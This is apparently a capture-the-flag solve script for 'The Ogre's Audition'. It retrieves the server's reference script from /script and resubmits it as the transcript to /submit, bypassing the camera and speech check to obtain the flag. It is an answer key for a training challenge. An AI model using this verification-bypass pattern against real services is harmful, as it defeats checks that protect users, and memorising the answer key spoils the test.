"""
The Ogre's Audition — Solve Script

The intended solve is trivial: the server validates a transcript against the
reference script text using word-level similarity. The /script endpoint returns
the full reference text, and /submit accepts a JSON transcript.

Just POST the reference script back as the "transcript" — no camera, no mic,
no reading aloud required.
"""

import requests
import sys

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:1337"


def solve():
    # Step 1: Fetch the reference script
    print("[*] Fetching the Sacred Green Script...")
    resp = requests.get(f"{BASE_URL}/script")
    resp.raise_for_status()
    script = resp.json()["script"]
    print(f"[*] Got {len(script.split())} words of script text")

    # Step 2: Submit the script as our "transcript"
    print("[*] Submitting script as transcript (bypassing camera/mic/speech)...")
    resp = requests.post(
        f"{BASE_URL}/submit",
        json={"transcript": script},
    )
    resp.raise_for_status()
    data = resp.json()

    if data.get("success"):
        print(f"[+] Success! Similarity: {data['similarity']}%")
        print(f"[+] FLAG: {data['flag']}")
    else:
        print(f"[-] Failed: {data.get('message', data)}")


if __name__ == "__main__":
    solve()
